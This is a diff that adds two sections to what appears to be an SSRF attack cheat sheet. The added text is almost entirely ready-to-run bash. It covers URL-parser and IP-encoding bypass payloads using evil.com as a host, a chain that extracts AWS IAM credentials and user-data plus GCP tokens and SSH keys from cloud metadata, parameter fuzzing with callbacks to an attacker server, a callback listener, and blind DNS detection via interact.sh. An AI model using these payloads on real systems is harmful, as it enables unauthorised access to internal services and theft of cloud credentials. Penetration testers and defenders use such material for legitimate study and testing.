@@ -816,3 +816,100 @@ cat > ssrf2.svg << 'EOF'
 </svg>
 EOF
 ```
+
+---
+
+## 14. SSRF URL Parser Abuse
+
+### URL Parser Differential Exploitation
+
+```bash
+# Exploit differences between URL parser and HTTP library
+# Technique: authority confusion with @ symbol
+curl "http://target/fetch?url=http://evil.com@internal-service:8080/admin"
+curl "http://target/fetch?url=http://internal-service.evil.com#@internal-service"
+
+# IPv6 address bypass for internal network access
+curl "http://target/fetch?url=http://[::1]:8080/admin"
+curl "http://target/fetch?url=http://[::ffff:127.0.0.1]:8080/admin"
+curl "http://target/fetch?url=http://[0:0:0:0:0:0:0:1]:8080/admin"
+
+# Decimal IP representation bypass
+curl "http://target/fetch?url=http://2130706433:8080/admin"
+curl "http://target/fetch?url=http://0x7f000001:8080/admin"
+curl "http://target/fetch?url=http://017700000001:8080/admin"
+curl "http://target/fetch?url=http://127.1:8080/admin"
+```
+
+### SSRF Cloud Metadata Deep Extraction
+
+```bash
+# AWS IMDSv2 full credential extraction chain
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Get IAM role name
+ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+# Extract temporary credentials
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | jq .
+
+# Get user-data (may contain bootstrap scripts with secrets)
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/user-data
+
+# GCP comprehensive metadata extraction via SSRF
+curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq .
+curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/project/attributes/ssh-keys"
+```
+
+---
+
+## 15. SSRF Detection and Scanning
+
+### Automated SSRF Parameter Discovery
+
+```bash
+# Fuzz common parameter names that may accept URLs
+ffuf -u "http://target/page?FUZZ=http://attacker-server/ssrf-test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -fs 0 -mc 200 -o ssrf_params.txt
+
+# Common SSRF-vulnerable parameter names
+for param in url dest redirect uri path callback next data reference file document input; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+    "http://target/page?${param}=http://attacker-server/ssrf-callback?src=${param}")
+  echo "[$param] HTTP $STATUS"
+done
+
+# Listen for SSRF callbacks on attacker server
+python3 -c "
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f'[SSRF CALLBACK] {self.client_address[0]} -> {self.path}')
+        self.send_response(200)
+        self.end_headers()
+HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
+"
+```
+
+### SSRF Blind Detection with DNS Exfiltration
+
+```bash
+# Use Burp Collaborator or interact.sh for blind SSRF detection
+# interact.sh client
+curl -s https://interact.sh | jq '.subdomain'  # Get unique subdomain
+
+# Test SSRF with DNS callback
+SSRF_DOMAIN="abcdef1234.oastify.com"
+curl "http://target/fetch?url=http://$SSRF_DOMAIN"
+curl "http://target/proxy?dest=http://$SSRF_DOMAIN"
+
+# Check interact.sh for received interactions
+curl -s "https://interact.sh/$SSRF_DOMAIN" | jq '.interactions'
+```
